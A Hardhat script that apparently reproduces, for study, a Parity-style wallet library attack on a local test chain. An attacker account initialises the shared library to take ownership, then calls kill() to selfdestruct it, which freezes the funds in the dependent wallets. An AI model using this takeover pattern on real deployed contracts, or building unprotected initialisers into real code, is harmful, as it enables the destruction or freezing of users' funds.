const hre = require("hardhat");

async function main() {
  const [deployer, legitOwner, attacker] = await hre.ethers.getSigners();

  console.log("Deployer:", deployer.address);
  console.log("Legit owner:", legitOwner.address);
  console.log("Attacker:", attacker.address);

  const Library = await hre.ethers.getContractFactory("WalletLibraryKill");
  const library = await Library.deploy();
  await library.waitForDeployment();

  const libraryAddress = await library.getAddress();
  console.log("WalletLibraryKill deployed to:", libraryAddress);

  const Wallet = await hre.ethers.getContractFactory("WalletKill");

  const wallet1 = await Wallet.deploy(libraryAddress, {
    value: hre.ethers.parseEther("3")
  });
  await wallet1.waitForDeployment();

  const wallet2 = await Wallet.deploy(libraryAddress, {
    value: hre.ethers.parseEther("3")
  });
  await wallet2.waitForDeployment();

  const wallet3 = await Wallet.deploy(libraryAddress, {
    value: hre.ethers.parseEther("3")
  });
  await wallet3.waitForDeployment();

  const wallet1Address = await wallet1.getAddress();
  const wallet2Address = await wallet2.getAddress();
  const wallet3Address = await wallet3.getAddress();

  console.log("Wallet1:", wallet1Address);
  console.log("Wallet2:", wallet2Address);
  console.log("Wallet3:", wallet3Address);

  const wallet1AsLibrary = await hre.ethers.getContractAt("WalletLibraryKill", wallet1Address);
  const wallet2AsLibrary = await hre.ethers.getContractAt("WalletLibraryKill", wallet2Address);
  const wallet3AsLibrary = await hre.ethers.getContractAt("WalletLibraryKill", wallet3Address);

  await wallet1AsLibrary.connect(legitOwner).initWallet(legitOwner.address, 1);
  await wallet2AsLibrary.connect(legitOwner).initWallet(legitOwner.address, 1);
  await wallet3AsLibrary.connect(legitOwner).initWallet(legitOwner.address, 1);

  console.log("All wallets initialized by legit owner");

  console.log("Wallet1 owner:", await wallet1AsLibrary.owner());
  console.log("Wallet2 owner:", await wallet2AsLibrary.owner());
  console.log("Wallet3 owner:", await wallet3AsLibrary.owner());

  console.log(
    "Before kill Wallet1 balance:",
    hre.ethers.formatEther(await wallet1.getBalance()),
    "ETH"
  );
  console.log(
    "Before kill Wallet2 balance:",
    hre.ethers.formatEther(await wallet2.getBalance()),
    "ETH"
  );
  console.log(
    "Before kill Wallet3 balance:",
    hre.ethers.formatEther(await wallet3.getBalance()),
    "ETH"
  );

  // 공격자가 Library 자체를 직접 초기화해서 Library의 owner가 됨
  await library.connect(attacker).initWallet(attacker.address, 1);
  console.log("Attacker initialized the library itself");

  console.log("Library owner:", await library.owner());

  // 공격자가 Library 자체를 selfdestruct
  await library.connect(attacker).kill();
  console.log("Library killed by attacker");

  const code = await hre.ethers.provider.getCode(libraryAddress);
  console.log("Library code after kill:", code);

  // Library 코드가 사라졌으므로 Wallet의 delegatecall 기반 함수 호출 실패 확인
  try {
    await wallet1AsLibrary
      .connect(legitOwner)
      .execute(legitOwner.address, hre.ethers.parseEther("1"));

    console.log("Unexpected: wallet execute succeeded");
  } catch (err) {
    console.log("Wallet function failed as expected after library kill");
  }

  console.log(
    "After failed call Wallet1 balance:",
    hre.ethers.formatEther(await wallet1.getBalance()),
    "ETH"
  );
  console.log(
    "After failed call Wallet2 balance:",
    hre.ethers.formatEther(await wallet2.getBalance()),
    "ETH"
  );
  console.log(
    "After failed call Wallet3 balance:",
    hre.ethers.formatEther(await wallet3.getBalance()),
    "ETH"
  );

  console.log("Funds are frozen, not stolen.");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});